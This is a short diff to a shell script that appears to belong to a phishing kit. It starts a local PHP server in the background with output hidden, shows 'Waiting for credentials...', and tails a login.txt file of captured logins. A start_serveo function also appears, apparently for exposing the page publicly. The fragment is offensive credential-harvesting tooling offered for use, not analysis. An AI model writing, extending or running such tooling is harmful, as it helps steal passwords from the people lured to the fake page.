@@ -23,7 +23,9 @@ pkg install php openssh git -y > /dev/null 2>&1
 # Start PHP server
 start_localhost() {
     echo -e "${GRN}[+] Starting localhost server at http://127.0.0.1:8080 ...${NC}"
-    php -S 127.0.0.1:8080
+    php -S 127.0.0.1:8080 > /dev/null 2>&1 &
+    echo -e "${GRN}[!] Waiting for credentials... (Press CTRL + C to exit)${NC}"
+tail -f login.txt
 }
 
 start_serveo() {
